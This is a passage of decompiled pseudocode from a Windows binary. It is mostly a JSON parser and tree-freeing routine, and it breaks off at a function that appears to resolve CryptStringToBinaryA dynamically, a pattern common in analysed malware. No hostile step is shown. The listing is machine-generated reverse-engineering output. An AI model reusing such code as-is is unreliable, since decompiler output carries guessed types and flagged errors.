          if ( !v10 || (*a1 = v8 + v7, v8 + v7 <= v10) )
          {
            v11 = ((int (__cdecl *)(unsigned int, _DWORD, unsigned int))a1[5])(v7, 0, a1[7]);
            v6[3] = v11;
            if ( v11 )
            {
              v6[2] = 0;
              return 1;
            }
            return 0;
          }
        }
LABEL_9:
        v6[3] = 0;
        return 0;
    }
    return 1;
  }
  return result;
}

//----- (00402560) --------------------------------------------------------
_DWORD *__usercall sub_402560@<eax>(_BYTE *a1@<edx>, int a2@<ecx>, unsigned int a3@<ebp>, unsigned int a4)
{
  _BYTE *v4; // edi
  unsigned int v6; // eax
  double v7; // xmm2_8
  double v8; // xmm3_8
  double v9; // xmm5_8
  unsigned int v10; // ecx
  __int64 v11; // xmm0_8
  void *(__cdecl *v12)(SIZE_T, int); // eax
  BOOL (__cdecl *v13)(LPVOID); // eax
  unsigned int v14; // eax
  double *v15; // esi
  int v16; // edx
  char v17; // cl
  unsigned int v18; // edi
  char v19; // cl
  unsigned int v20; // edi
  char v21; // cl
  unsigned int v22; // edi
  char v23; // cl
  int v24; // eax
  _BYTE *v25; // edi
  _BYTE *v26; // edi
  char v27; // cl
  unsigned int v28; // edi
  char v29; // cl
  unsigned int v30; // edi
  char v31; // cl
  unsigned int v32; // edi
  char v33; // cl
  unsigned int v34; // esi
  int v35; // edx
  char v36; // al
  unsigned int v37; // esi
  unsigned int v38; // esi
  unsigned int v39; // esi
  int v40; // eax
  int v41; // eax
  bool v42; // zf
  unsigned int v43; // edx
  unsigned int v44; // eax
  int v45; // edx
  int v46; // eax
  _BYTE *v47; // edi
  _BYTE *v48; // edi
  _BYTE *v49; // edi
  _BYTE *v50; // edi
  _BYTE *v51; // edi
  int v52; // eax
  _BYTE *v53; // edi
  _BYTE *v54; // edi
  char i; // cl
  int v56; // eax
  unsigned int v57; // eax
  double v58; // xmm1_8
  int v59; // eax
  __int64 v60; // rax
  unsigned int v61; // edx
  unsigned __int64 v62; // rt0
  int v63; // ecx
  __m128i v64; // xmm0
  int v65; // eax
  unsigned int v66; // eax
  int v67; // eax
  unsigned int v68; // edx
  int v69; // eax
  int v70; // eax
  int v71; // edx
  double v72; // xmm0_8
  unsigned int v73; // eax
  int v74; // eax
  unsigned int v75; // edx
  int v76; // eax
  int v77; // eax
  int v78; // eax
  int v79; // ecx
  unsigned int v80; // edx
  int v81; // eax
  bool v82; // sf
  _DWORD *result; // eax
  _DWORD *v84; // eax
  _DWORD *v85; // ecx
  unsigned int v86; // edi
  _DWORD *v87; // esi
  double v88; // [esp-90h] [ebp-9Ch]
  int v89; // [esp-84h] [ebp-90h]
  double v90; // [esp-80h] [ebp-8Ch]
  _BYTE *v91; // [esp-74h] [ebp-80h]
  int v92; // [esp-70h] [ebp-7Ch]
  unsigned int v93; // [esp-6Ch] [ebp-78h]
  double v94; // [esp-68h] [ebp-74h]
  _DWORD *v95; // [esp-60h] [ebp-6Ch] BYREF
  _DWORD *v96; // [esp-5Ch] [ebp-68h] BYREF
  unsigned __int8 v97; // [esp-57h] [ebp-63h]
  char v98; // [esp-56h] [ebp-62h]
  unsigned __int8 v99; // [esp-55h] [ebp-61h]
  int v100; // [esp-54h] [ebp-60h]
  int v101; // [esp-50h] [ebp-5Ch]
  double *v102; // [esp-4Ch] [ebp-58h] BYREF
  char v103; // [esp-45h] [ebp-51h]
  _BYTE *v104; // [esp-44h] [ebp-50h]
  int v105; // [esp-40h] [ebp-4Ch]
  unsigned int v106; // [esp-3Ch] [ebp-48h]
  unsigned int v107[17]; // [esp-38h] [ebp-44h] BYREF
  unsigned int retaddr; // [esp+Ch] [ebp+0h]

  v107[14] = a3;
  v107[15] = retaddr;
  v95 = 0;
  v4 = a1;
  v91 = a1;
  memset(v107, 0, 0x34u);
  v6 = a4;
  v7 = 0.0;
  v8 = 0.0;
  v94 = 0.0;
  v9 = 0.0;
  v88 = 0.0;
  v90 = 0.0;
  if ( a4 >= 3 && *v4 == 0xEF && v4[1] == 0xBB && v4[2] == 0xBF )
  {
    v4 += 3;
    v6 = a4 - 3;
    v91 = v4;
  }
  v10 = (unsigned int)&v4[v6];
  v11 = *(_QWORD *)(a2 + 16);
  *(_OWORD *)&v107[3] = *(_OWORD *)a2;
  v107[1] = -1;
  v12 = (void *(__cdecl *)(SIZE_T, int))_mm_cvtsi128_si32(_mm_srli_si128(*(__m128i *)&v107[3], 8));
  *(_QWORD *)&v107[7] = v11;
  v104 = (_BYTE *)v10;
  v107[9] = 1;
  if ( !v12 )
    v12 = sub_402370;
  v107[5] = (unsigned int)v12;
  v13 = (BOOL (__cdecl *)(LPVOID))v107[6];
  if ( !v107[6] )
    v13 = sub_4023D0;
  v107[1] -= 8;
  v107[6] = (unsigned int)v13;
  v107[2] = -9;
  do
  {
    v14 = 0;
    v101 = 0;
    v15 = 0;
    v106 = 0;
    v16 = 8;
    v96 = 0;
    v102 = 0;
    v105 = 8;
    v107[11] = 1;
    while ( 1 )
    {
      v107[10] = (unsigned int)v4;
      if ( v4 == (_BYTE *)v10 )
        LOBYTE(v10) = 0;
      else
        LOBYTE(v10) = *v4;
      v103 = v10;
      if ( (v16 & 0x20) != 0 )
      {
        if ( !(_BYTE)v10 || v14 > v107[1] )
          goto LABEL_240;
        if ( (v16 & 0x10) != 0 )
        {
          v16 &= ~0x10u;
          v105 = v16;
          switch ( (char)v10 )
          {
            case 'b':
              v14 = v106;
              if ( !v107[9] )
                *(_BYTE *)(v106 + v101) = 8;
              goto LABEL_22;
            case 'f':
              v14 = v106;
              if ( !v107[9] )
                *(_BYTE *)(v106 + v101) = 12;
              goto LABEL_22;
            case 'n':
              v14 = v106;
              if ( !v107[9] )
                *(_BYTE *)(v106 + v101) = 10;
              goto LABEL_22;
            case 'r':
              v14 = v106;
              if ( !v107[9] )
                *(_BYTE *)(v106 + v101) = 13;
              goto LABEL_22;
            case 't':
              v14 = v106;
              if ( !v107[9] )
                *(_BYTE *)(v106 + v101) = 9;
              goto LABEL_22;
            case 'u':
              if ( v104 - v4 <= 4 )
                goto LABEL_240;
              v17 = v4[1];
              v18 = (unsigned int)(v4 + 1);
              v107[10] = v18;
              v103 = sub_4022E0(v17);
              if ( v103 == -1 )
                goto LABEL_240;
              v19 = *(_BYTE *)(v18 + 1);
              v20 = v18 + 1;
              v107[10] = v20;
              v99 = sub_4022E0(v19);
              if ( v99 == 0xFF )
                goto LABEL_240;
              v21 = *(_BYTE *)(v20 + 1);
              v22 = v20 + 1;
              v107[10] = v22;
              v98 = sub_4022E0(v21);
              if ( v98 == -1 )
                goto LABEL_240;
              v23 = *(_BYTE *)(v22 + 1);
              v4 = (_BYTE *)(v22 + 1);
              v107[10] = (unsigned int)v4;
              v97 = sub_4022E0(v23);
              if ( v97 == 0xFF )
                goto LABEL_240;
              v24 = v99 | (unsigned __int8)(16 * v103);
              v10 = v97 | (unsigned __int8)(16 * v98) | (v24 << 8);
              v100 = v10;
              if ( ((v97 | (unsigned __int16)((unsigned __int8)(16 * v98) | (unsigned __int16)((_WORD)v24 << 8))) & 0xF800) != 55296 )
                goto LABEL_48;
              if ( v104 - v4 <= 6 )
                goto LABEL_240;
              v25 = v4 + 1;
              v107[10] = (unsigned int)v25;
              if ( *v25 != 92 )
                goto LABEL_240;
              v26 = v25 + 1;
              v107[10] = (unsigned int)v26;
              if ( *v26 != 117 )
                goto LABEL_240;
              v27 = v26[1];
              v28 = (unsigned int)(v26 + 1);
              v107[10] = v28;
              if ( sub_4022E0(v27) == -1 )
                goto LABEL_240;
              v29 = *(_BYTE *)(v28 + 1);
              v30 = v28 + 1;
              v107[10] = v30;
              v97 = sub_4022E0(v29);
              if ( v97 == 0xFF )
                goto LABEL_240;
              v31 = *(_BYTE *)(v30 + 1);
              v32 = v30 + 1;
              v107[10] = v32;
              v98 = sub_4022E0(v31);
              if ( v98 == -1 )
                goto LABEL_240;
              v33 = *(_BYTE *)(v32 + 1);
              v4 = (_BYTE *)(v32 + 1);
              v107[10] = (unsigned int)v4;
              v99 = sub_4022E0(v33);
              if ( v99 == 0xFF )
                goto LABEL_240;
              v10 = v99 | (unsigned __int8)(16 * v98) | ((v97 & 3 | (4 * (v100 & 0x3BF | 0x40))) << 8);
              v100 = v10;
LABEL_48:
              if ( v10 <= 0x7F )
              {
LABEL_49:
                v14 = v106;
                goto LABEL_50;
              }
              if ( v10 > 0x7FF )
              {
                if ( v10 > 0xFFFF )
                {
                  if ( v107[9] )
                  {
                    v14 = v106 + 4;
                    break;
                  }
                  v39 = v106;
                  v35 = v101;
                  ++v106;
                  *(_BYTE *)(v39 + v101) = (v10 >> 18) | 0xF0;
                  v36 = (v10 >> 12) & 0x3F | 0x80;
                }
                else
                {
                  if ( v107[9] )
                  {
                    v14 = v106 + 3;
                    break;
                  }
                  v35 = v101;
                  v36 = (v10 >> 12) | 0xE0;
                }
                v37 = v106++;
                *(_BYTE *)(v37 + v35) = v36;
                v38 = v106;
                *(_BYTE *)(v106 + v35) = (v10 >> 6) & 0x3F | 0x80;
                v16 = v105;
                *(_BYTE *)(v38 + v101 + 1) = v10 & 0x3F | 0x80;
                v14 = v38 + 2;
                v15 = v102;
                break;
              }
              if ( v107[9] )
              {
                v14 = v106 + 2;
              }
              else
              {
                v34 = v106;
                *(_BYTE *)(v106 + v101) = (v10 >> 6) | 0xC0;
                *(_BYTE *)(v34 + v101 + 1) = v100 & 0x3F | 0x80;
                v14 = v34 + 2;
                v15 = v102;
              }
              break;
            default:
              goto LABEL_49;
          }
LABEL_23:
          v106 = v14;
LABEL_24:
          v10 = (unsigned int)v104;
          goto LABEL_25;
        }
        if ( (_BYTE)v10 == 92 )
        {
          v16 |= 0x10u;
          v105 = v16;
          goto LABEL_24;
        }
        if ( (_BYTE)v10 != 34 )
        {
LABEL_50:
          if ( !v107[9] )
          {
            *(_BYTE *)(v14 + v101) = v10;
            v15 = v102;
          }
LABEL_22:
          ++v14;
          goto LABEL_23;
        }
        if ( !v107[9] )
        {
          *(_BYTE *)(v14 + v101) = 0;
          v15 = v102;
        }
        v40 = *((_DWORD *)v15 + 1);
        v16 &= ~0x20u;
        v105 = v16;
        v101 = 0;
        v41 = v40 - 1;
        if ( !v41 )
        {
          if ( v107[9] )
          {
            *((_DWORD *)v15 + 3) += v106 + 1;
            v16 |= 0x48u;
            v14 = v106;
            v105 = v16;
          }
          else
          {
            *(_DWORD *)(*((_DWORD *)v15 + 3) + 12 * *((_DWORD *)v15 + 2)) = *((_DWORD *)v15 + 4);
            v43 = v106;
            *(_DWORD *)(*((_DWORD *)v15 + 3) + 12 * *((_DWORD *)v15 + 2) + 4) = v106;
            v44 = v43 + 1;
            v45 = v105;
            *((_DWORD *)v15 + 4) += v44;
            v16 = v45 | 0x48;
            v105 = v16;
LABEL_82:
            v14 = v106;
          }
          goto LABEL_24;
        }
        v42 = v41 == 4;
        v14 = v106;
        if ( v42 )
        {
          v16 |= 1u;
          *((_DWORD *)v15 + 2) = v106;
          v105 = v16;
        }
      }
      if ( (v107[4] & 1) == 0 )
        break;
      if ( (v16 & 0x6000) != 0 )
      {
        if ( (v16 & 0x2000) != 0 )
        {
          if ( (_BYTE)v10 == 13 || (_BYTE)v10 == 10 || !(_BYTE)v10 )
          {
            v16 &= ~0x2000u;
            --v4;
            v105 = v16;
          }
          goto LABEL_24;
        }
        if ( (v16 & 0x4000) == 0 )
          break;
        if ( !(_BYTE)v10 )
          goto LABEL_240;
        v42 = (_BYTE)v10 == 42;
        v10 = (unsigned int)v104;
        if ( v42 )
        {
          if ( v4 >= v104 - 1 )
            goto LABEL_96;
          v14 = v106;
          if ( v4[1] == 47 )
          {
            v16 &= ~0x4000u;
            ++v4;
            v105 = v16;
          }
        }
      }
      else
      {
        if ( (_BYTE)v10 != 47 )
          break;
        if ( (v16 & 0x88) == 0 && *((_DWORD *)v15 + 1) != 1 )
          goto LABEL_240;
        v10 = (unsigned int)v104;
        v107[10] = (unsigned int)++v4;
        if ( v4 == v104 )
          goto LABEL_240;
        if ( *v4 != 42 )
        {
          if ( *v4 != 47 )
            goto LABEL_240;
          v16 |= 0x2000u;
          v105 = v16;
LABEL_96:
          v14 = v106;
          goto LABEL_25;
        }
        v14 = v106;
        v16 |= 0x4000u;
        v105 = v16;
      }
LABEL_25:
      v8 = v88;
      ++v4;
      v9 = v90;
    }
    if ( (v16 & 0x80u) == 0 )
    {
      if ( (v16 & 8) != 0 )
      {
        v100 = (char)v10;
        v15 = v102;
        v46 = (char)v10 - 9;
        switch ( (char)v10 )
        {
          case 9:
          case 13:
          case 32:
            goto LABEL_82;
          case 10:
            goto LABEL_101;
          case 11:
          case 12:
          case 14:
          case 15:
          case 16:
          case 17:
          case 18:
          case 19:
          case 20:
          case 21:
          case 22:
          case 23:
          case 24:
          case 25:
          case 26:
          case 27:
          case 28:
          case 29:
          case 30:
          case 31:
          case 33:
          case 34:
          case 35:
          case 36:
          case 37:
          case 38:
          case 39:
          case 40:
          case 41:
          case 42:
          case 43:
          case 44:
          case 45:
          case 46:
          case 47:
          case 48:
          case 49:
          case 50:
          case 51:
          case 52:
          case 53:
          case 54:
          case 55:
          case 56:
          case 57:
          case 58:
          case 59:
          case 60:
          case 61:
          case 62:
          case 63:
          case 64:
          case 65:
          case 66:
          case 67:
          case 68:
          case 69:
          case 70:
          case 71:
          case 72:
          case 73:
          case 74:
          case 75:
          case 76:
          case 77:
          case 78:
          case 79:
          case 80:
          case 81:
          case 82:
          case 83:
          case 84:
          case 85:
          case 86:
          case 87:
          case 88:
          case 89:
          case 90:
          case 91:
          case 92:
            v46 = v100;
            goto LABEL_108;
          case 93:
            if ( !v102 || *((_DWORD *)v102 + 1) != 2 )
              goto LABEL_240;
            v16 = v16 & 0xFFFFFFF2 | 1;
            goto LABEL_224;
          default:
LABEL_108:
            if ( (v16 & 4) != 0 )
            {
              if ( (_BYTE)v10 != 44 )
                goto LABEL_240;
              v14 = v106;
              v16 &= ~4u;
              v105 = v16;
            }
            else if ( (v16 & 0x40) != 0 )
            {
              if ( (_BYTE)v10 != 58 )
                goto LABEL_240;
              v14 = v106;
              v16 &= ~0x40u;
              v105 = v16;
            }
            else
            {
              v105 = v16 & 0xFFFFFFF7;
              switch ( v46 )
              {
                case '"':
                  if ( !sub_4023F0(v107, &v102, &v96, (int)&v95, 5) )
                    goto LABEL_240;
                  v15 = v102;
                  v4 = (_BYTE *)v107[10];
                  v16 = v105 | 0x20;
                  v7 = v94;
                  v101 = *((_DWORD *)v102 + 3);
                  v14 = 0;
                  v105 |= 0x20u;
                  goto LABEL_23;
                case '#':
                case '$':
                case '%':
                case '&':
                case '\'':
                case '(':
                case ')':
                case '*':
                case '+':
                case ',':
                case '-':
                case '.':
                case '/':
                case '0':
                case '1':
                case '2':
                case '3':
                case '4':
                case '5':
                case '6':
                case '7':
                case '8':
                case '9':
                case ':':
                case ';':
                case '<':
                case '=':
                case '>':
                case '?':
                case '@':
                case 'A':
                case 'B':
                case 'C':
                case 'D':
                case 'E':
                case 'F':
                case 'G':
                case 'H':
                case 'I':
                case 'J':
                case 'K':
                case 'L':
                case 'M':
                case 'N':
                case 'O':
                case 'P':
                case 'Q':
                case 'R':
                case 'S':
                case 'T':
                case 'U':
                case 'V':
                case 'W':
                case 'X':
                case 'Y':
                case 'Z':
                case '\\':
                case ']':
                case '^':
                case '_':
                case '`':
                case 'a':
                case 'b':
                case 'c':
                case 'd':
                case 'e':
                case 'g':
                case 'h':
                case 'i':
                case 'j':
                case 'k':
                case 'l':
                case 'm':
                case 'o':
                case 'p':
                case 'q':
                case 'r':
                case 's':
                case 'u':
                case 'v':
                case 'w':
                case 'x':
                case 'y':
                case 'z':
                  v46 = v100;
                  goto LABEL_141;
                case '[':
                  if ( !sub_4023F0(v107, &v102, &v96, (int)&v95, 2) )
                    goto LABEL_240;
                  v4 = (_BYTE *)v107[10];
                  v16 = v105 | 8;
                  v7 = v94;
                  v15 = v102;
                  v14 = v106;
                  v105 |= 8u;
                  goto LABEL_24;
                case 'f':
                  if ( v104 - v4 < 4 )
                    goto LABEL_240;
                  v49 = v4 + 1;
                  v107[10] = (unsigned int)v49;
                  if ( *v49 != 97 )
                    goto LABEL_240;
                  v50 = v49 + 1;
                  v107[10] = (unsigned int)v50;
                  if ( *v50 != 108 )
                    goto LABEL_240;
                  v51 = v50 + 1;
                  v107[10] = (unsigned int)v51;
                  if ( *v51 != 115 )
                    goto LABEL_240;
                  v107[10] = (unsigned int)(v51 + 1);
                  if ( v51[1] != 101 )
                    goto LABEL_240;
                  v52 = sub_4023F0(v107, &v102, &v96, (int)&v95, 6);
                  goto LABEL_133;
                case 'n':
                  if ( v104 - v4 < 3 )
                    goto LABEL_240;
                  v53 = v4 + 1;
                  v107[10] = (unsigned int)v53;
                  if ( *v53 != 117 )
                    goto LABEL_240;
                  v54 = v53 + 1;
                  v107[10] = (unsigned int)v54;
                  if ( *v54 != 108 )
                    goto LABEL_240;
                  v107[10] = (unsigned int)(v54 + 1);
                  if ( v54[1] != 108 )
                    goto LABEL_240;
                  v52 = sub_4023F0(v107, &v102, &v96, (int)&v95, 7);
LABEL_133:
                  if ( !v52 )
                    goto LABEL_240;
                  v4 = (_BYTE *)v107[10];
                  v16 = v105 | 1;
                  v7 = v94;
                  v15 = v102;
                  goto LABEL_224;
                case 't':
                  if ( v104 - v4 < 3 )
                    goto LABEL_240;
                  v47 = v4 + 1;
                  v107[10] = (unsigned int)v47;
                  if ( *v47 != 114 )
                    goto LABEL_240;
                  v48 = v47 + 1;
                  v107[10] = (unsigned int)v48;
                  if ( *v48 != 117 )
                    goto LABEL_240;
                  v107[10] = (unsigned int)(v48 + 1);
                  if ( v48[1] != 101 || !sub_4023F0(v107, &v102, &v96, (int)&v95, 6) )
                    goto LABEL_240;
                  v15 = v102;
                  v4 = (_BYTE *)v107[10];
                  v16 = v105 | 1;
                  v7 = v94;
                  *((_DWORD *)v102 + 2) = 1;
                  goto LABEL_224;
                case '{':
                  if ( !sub_4023F0(v107, &v102, &v96, (int)&v95, 1) )
                    goto LABEL_240;
                  v4 = (_BYTE *)v107[10];
                  v7 = v94;
                  v16 = v105;
                  v15 = v102;
                  v14 = v106;
                  goto LABEL_24;
                default:
LABEL_141:
                  if ( ((unsigned int)(v46 - 48) > 9 || !v100) && (_BYTE)v10 != 45
                    || !sub_4023F0(v107, &v102, &v96, (int)&v95, 3) )
                  {
                    goto LABEL_240;
                  }
                  v4 = (_BYTE *)v107[10];
                  if ( !v107[9] )
                  {
                    for ( i = v103;
                          (unsigned int)(i - 48) <= 9 && i || i == 43 || i == 45 || i == 101 || i == 69 || i == 46;
                          i = *v4 )
                    {
                      v107[10] = (unsigned int)++v4;
                      if ( v4 == v104 )
                        break;
                    }
                    v7 = v94;
                    v16 = v105 | 3;
                    v15 = v102;
                    goto LABEL_224;
                  }
                  v15 = v102;
                  v7 = 0.0;
                  v14 = v106;
                  v94 = 0.0;
                  v90 = 0.0;
                  v88 = 0.0;
                  if ( v103 != 45 )
                  {
                    v16 = v105 & 0xFFFFE0FD | 2;
                    v105 = v16;
                    goto LABEL_226;
                  }
                  v16 = v105 & 0xFFFFE0FF | 0x100;
                  v105 = v16;
                  break;
              }
            }
            break;
        }
        goto LABEL_24;
      }
      v56 = *((_DWORD *)v15 + 1);
      if ( v56 == 1 )
      {
        switch ( (char)v10 )
        {
          case 9:
          case 13:
          case 32:
            goto LABEL_82;
          case 10:
LABEL_101:
            ++v107[11];
            v14 = v106;
            v107[12] = 0;
            goto LABEL_24;
          case 34:
            if ( (v16 & 4) != 0 )
              goto LABEL_240;
            v16 |= 0x20u;
            v101 = *((_DWORD *)v15 + 4);
            v14 = 0;
            v105 = v16;
            v106 = 0;
            goto LABEL_226;
          case 44:
            if ( (v16 & 4) == 0 )
              goto LABEL_240;
            v16 &= ~4u;
            goto LABEL_224;
          case 125:
            v16 = v16 & 0xFFFFFFFA | 1;
            goto LABEL_224;
          default:
            goto LABEL_240;
        }
      }
      if ( (unsigned int)(v56 - 3) > 1 )
        goto LABEL_225;
      v57 = (char)v10 - 48;
      v100 = v57;
      if ( v57 > 9 || !(_BYTE)v10 )
      {
        if ( (_BYTE)v10 == 43 || (_BYTE)v10 == 45 )
        {
          if ( (v16 & 0xC00) != 1024 )
            goto LABEL_190;
          v65 = 6144;
          if ( (_BYTE)v10 != 45 )
            v65 = 2048;
          v16 |= v65;
          v14 = v106;
          v105 = v16;
          goto LABEL_24;
        }
        if ( (_BYTE)v10 == 46 && *((_DWORD *)v15 + 1) == 3 )
        {
          if ( v7 == 0.0 )
            goto LABEL_240;
          *((_DWORD *)v15 + 1) = 4;
          v7 = 0.0;
          v14 = v106;
          v16 = v105 | 0x8000;
          v15[1] = (double)*((__int64 *)v15 + 1);
          v105 = v16;
          v94 = 0.0;
          goto LABEL_24;
        }
LABEL_190:
        if ( (v16 & 0x400) != 0 )
        {
          if ( v7 == 0.0 )
            goto LABEL_240;
          v72 = v8;
          if ( (v16 & 0x1000) != 0 )
            v72 = -v8;
          v73 = (unsigned int)v72;
          if ( (unsigned int)v72 )
          {
            v75 = v73 >> 1;
            if ( (v73 & 1) != 0 )
            {
              v77 = sub_402280(v10, v75);
              v74 = 10 * v77 * v77;
            }
            else
            {
              v76 = sub_402280(v10, v75);
              v74 = v76 * v76;
            }
          }
          else
          {
            v74 = 1;
          }
          v16 = v105;
          v15[1] = (double)v74 * v15[1];
        }
        else
        {
          if ( *((_DWORD *)v15 + 1) == 4 )
          {
            if ( v7 == 0.0 )
              goto LABEL_240;
            v66 = (unsigned int)v7;
            if ( (unsigned int)v7 )
            {
              v68 = v66 >> 1;
              if ( (v66 & 1) != 0 )
              {
                v70 = sub_402280(v10, v68);
                v67 = 10 * v70 * v70;
              }
              else
              {
                v69 = sub_402280(v10, v68);
                v67 = v69 * v69;
              }
            }
            else
            {
              v67 = 1;
            }
            v16 = v105;
            LOBYTE(v10) = v103;
            v15[1] = v90 / (double)v67 + v15[1];
          }
          if ( (_BYTE)v10 == 101 || (_BYTE)v10 == 69 )
          {
            v71 = v16 | 0x400;
            v42 = *((_DWORD *)v15 + 1) == 3;
            v105 = v71;
            if ( v42 )
            {
              *((_DWORD *)v15 + 1) = 4;
              v71 = v105;
              v15[1] = (double)*((__int64 *)v15 + 1);
            }
            v14 = v106;
            v7 = 0.0;
            v16 = v71 & 0xFFFFFDFF;
            v94 = 0.0;
            v105 = v16;
            goto LABEL_24;
          }
        }
        if ( (v16 & 0x100) != 0 )
        {
          if ( *((_DWORD *)v15 + 1) == 3 )
          {
            v7 = v94;
            v78 = (*((_DWORD *)v15 + 2) != 0) + *((_DWORD *)v15 + 3);
            *((_DWORD *)v15 + 2) = -*((_DWORD *)v15 + 2);
            v16 |= 3u;
            *((_DWORD *)v15 + 3) = -v78;
LABEL_224:
            v105 = v16;
LABEL_225:
            v14 = v106;
LABEL_226:
            if ( (v16 & 2) != 0 )
            {
              v16 &= ~2u;
              --v4;
              v105 = v16;
              v107[10] = (unsigned int)v4;
            }
            if ( (v16 & 1) != 0 )
            {
              v79 = *(_DWORD *)v15;
              v80 = v16 & 0xFFFFFFFE;
              if ( *(_DWORD *)v15 )
              {
                v16 = (8 * (*(_DWORD *)(v79 + 4) == 2) + 4) | v80;
                v105 = v16;
                if ( !v107[9] )
                {
                  if ( *(_DWORD *)(v79 + 4) == 1 )
                  {
                    *(_DWORD *)(*(_DWORD *)(*(_DWORD *)v15 + 12) + 12 * *(_DWORD *)(v79 + 8) + 8) = v15;
                  }
                  else if ( *(_DWORD *)(v79 + 4) == 2 )
                  {
                    *(_DWORD *)(*(_DWORD *)(*(_DWORD *)v15 + 12) + 4 * *(_DWORD *)(v79 + 8)) = v15;
                  }
                }
                v81 = *(_DWORD *)v15;
                if ( ++*(_DWORD *)(v81 + 8) > v107[1] )
                {
LABEL_240:
                  v84 = v95;
                  v85 = v96;
                  if ( v107[9] )
                    v84 = v96;
                  if ( v84 )
                  {
                    v86 = v107[7];
                    do
                    {
                      v87 = (_DWORD *)v84[4];
                      ((void (__cdecl *)(_DWORD *, unsigned int))v107[6])(v84, v86);
                      v84 = v87;
                    }
                    while ( v87 );
                    v85 = v96;
                  }
                  if ( !v107[9] )
                    sub_403560((int)&v107[3], v85);
                  return 0;
                }
                v15 = *(double **)v15;
                v14 = v106;
                v102 = v15;
              }
              else
              {
                v16 = v80 | 0x84;
                v105 = v16;
              }
            }
            goto LABEL_24;
          }
          v15[1] = -v15[1];
        }
        v7 = v94;
        v16 |= 3u;
        goto LABEL_224;
      }
      v7 = v7 + 1.0;
      v94 = v7;
      if ( (v16 & 0x400) != 0 )
      {
        v64 = _mm_cvtsi32_si128(v57);
        v16 |= 0x800u;
        v14 = v106;
        v105 = v16;
        v88 = v8 * 10.0 + _mm_cvtepi32_pd(v64).m128d_f64[0];
        goto LABEL_24;
      }
      if ( *((_DWORD *)v15 + 1) == 3 )
      {
        if ( (v16 & 0x200) != 0 )
          goto LABEL_240;
        if ( v7 == 1.0 && (_BYTE)v10 == 48 )
          v105 = v16 | 0x200;
        v59 = v100;
        v93 = *((_DWORD *)v15 + 2);
        v100 = *((_DWORD *)v15 + 3);
        v89 = v59;
        v92 = v59 >> 31;
        v60 = (0x7FFFFFFFFFFFFFFFi64 - v59) / 10;
        if ( SHIDWORD(v60) > v100 )
        {
          v61 = v93;
        }
        else if ( SHIDWORD(v60) < v100 || (v61 = v93, (unsigned int)v60 < v93) )
        {
          --v4;
          v15 = v102;
          *((_DWORD *)v102 + 1) = 4;
          v94 = v7 - 1.0;
          v7 = v7 - 1.0;
          v16 = v105;
          v14 = v106;
          v15[1] = (double)*((__int64 *)v15 + 1);
          goto LABEL_24;
        }
        v14 = v106;
        HIDWORD(v62) = (__PAIR64__(v100, v61) >> 30) + __CFADD__(4 * v61, v61) + v100;
        LODWORD(v62) = 5 * v61;
        v100 = (__PAIR64__(v92, v89) + __PAIR64__(v62 >> 31, 10 * v61)) >> 32;
        v15 = v102;
        v63 = v100;
        *((_DWORD *)v102 + 2) = v89 + 10 * v61;
        v16 = v105;
        *((_DWORD *)v15 + 3) = v63;
        goto LABEL_24;
      }
      v14 = v106;
      v10 = (unsigned int)v104;
      v58 = (double)v100;
      if ( (v16 & 0x8000) != 0 )
        v90 = v9 * 10.0 + v58;
      else
        v15[1] = v15[1] * 10.0 + v58;
      goto LABEL_25;
    }
    if ( (_BYTE)v10 )
    {
      switch ( (char)v10 )
      {
        case 9:
        case 13:
        case 32:
          goto LABEL_82;
        case 10:
          goto LABEL_101;
        default:
          goto LABEL_240;
      }
    }
    v82 = (--v107[9] & 0x80000000) != 0;
    result = v96;
    v10 = (unsigned int)v104;
    v4 = v91;
    v95 = v96;
  }
  while ( !v82 );
  return result;
}
// 402560: could not find valid save-restore pair for ebp
// 402683: variable 'v16' is possibly undefined

//----- (00403560) --------------------------------------------------------
void __fastcall sub_403560(int a1, _DWORD *a2)
{
  _DWORD *v2; // esi
  int v4; // ecx
  int v5; // eax
  int v6; // ecx
  int v7; // eax
  _DWORD *v8; // eax
  int v9; // eax

  v2 = a2;
  if ( a2 )
  {
    *a2 = 0;
    while ( v2[1] != 1 )
    {
      if ( v2[1] != 2 )
      {
        if ( v2[1] == 5 )
          goto LABEL_10;
        goto LABEL_11;
      }
      v4 = v2[2];
      if ( !v4 )
        goto LABEL_10;
      v5 = v2[3];
      v6 = v4 - 1;
      v2[2] = v6;
      v2 = *(_DWORD **)(v5 + 4 * v6);
LABEL_13:
      if ( !v2 )
        return;
    }
    v7 = v2[2];
    if ( v7 )
    {
      v9 = v7 - 1;
      v2[2] = v9;
      v2 = *(_DWORD **)(v2[3] + 12 * v9 + 8);
      goto LABEL_13;
    }
LABEL_10:
    (*(void (__cdecl **)(_DWORD, _DWORD))(a1 + 12))(v2[3], *(_DWORD *)(a1 + 16));
LABEL_11:
    v8 = v2;
    v2 = (_DWORD *)*v2;
    (*(void (__cdecl **)(_DWORD *, _DWORD))(a1 + 12))(v8, *(_DWORD *)(a1 + 16));
    goto LABEL_13;
  }
}

//----- (004035E0) --------------------------------------------------------
int __usercall sub_4035E0@<eax>(int a1@<ebx>, DWORD *a2@<edi>, int a3@<esi>)
{
  int result; // eax
  int v4; // ebx
  const char *v5; // edi
  int v6; // eax
  int v7; // ecx
  char v8; // bl
  int v9; // edx
  int v10; // ecx
  int v11; // eax
  int v12; // ebx
  int v13; // esi
  HANDLE ProcessHeap; // eax
  const CHAR *v15; // eax
  const CHAR *v16; // edi
  const CHAR *v17; // ecx
  int v18; // esi
  int v19; // edx
  CHAR v20; // al
  const char *v21; // edi
  int v22; // eax
  int v23; // ecx
  char v24; // bl
  int v25; // edx
  int v26; // ecx
  _BYTE *v27; // esi
  int v28; // eax
  HANDLE v29; // eax
  _WORD *v30; // edi
  int v31; // edx
  int v32; // eax
  int v33; // eax
  const char *v34; // edi
  int v35; // eax
  int v36; // ecx
  char v37; // bl
  int v38; // edx
  int v39; // ecx
  int v40; // eax
  _BYTE *v41; // esi
  HANDLE v42; // eax
  _WORD *v43; // edi
  int v44; // edx
  int v45; // eax
  int v46; // eax
  const char *v47; // edi
  int v48; // eax
  int v49; // ecx
  char v50; // bl
  int v51; // edx
  int v52; // ecx
  int v53; // ebx
  _BYTE *v54; // esi
  HMODULE LibraryA; // eax
  BOOL (__stdcall *CryptStringToBinaryA)(LPCSTR, DWORD, DWORD, BYTE *, DWORD *, DWORD *, DWORD *); // edx
  int v57; // ecx
  HANDLE v58; // eax
  const void *v59; // edi
  _BYTE *v60; // esi
  HMODULE v61; // ecx
  BOOL (__stdcall *ProcAddress)(LPCSTR, DWORD, DWORD, BYTE *, DWORD *, DWORD *, DWORD *); // eax
  int v63; // ecx
